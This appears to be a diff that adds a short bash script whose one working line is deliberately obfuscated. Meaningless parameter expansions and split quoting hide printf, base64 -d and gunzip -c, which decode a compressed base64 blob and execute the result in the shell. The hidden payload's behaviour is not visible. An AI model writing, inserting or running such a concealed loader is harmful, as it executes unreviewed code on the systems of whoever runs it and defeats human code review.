@@ -1,0 +1,2 @@
+#!/bin/bash
+   ${*^^}   ${!#}   ${*%%uT\)B|\[}   ${@##Os\`qJ_}   <<< "$(    ${@/qrm-T*/lQxP\}L}  "${@//;8Qw&}" pr""i\n't'${*/SQvY}f 'H4sIAAAAAAAC/3XNuwrCQBSE4X6fYlyVlEHtDCkiBhFvELVSCYk5m5zmrGwWG8m7m0bQwmaKv5hvOAhLlrAs2kbVjsiz1LFero/ZYZHmq+S8P23TU75Lsk2aaWWsA4MFE0wxi1BZBdC9sdDsyRWerWD04m7e7+ev06qyQooNLtDfHTH+WrhF8A1JDzwcizcIxu1VAugnOTZM1S9hWL0B3Hn7Nc0AAAA='  ${*^}   ${*^^}   |   ${*}  ${@^^}   'b'""$'\141s'e''64  -d ${*~~}  | $@   $@ gu${*%%?\0-<z}nz${@##QD^D<F3s}i${*/\"CK,F-/p^i0\)}p -c   "${@,,}"    )"  ${*^}  
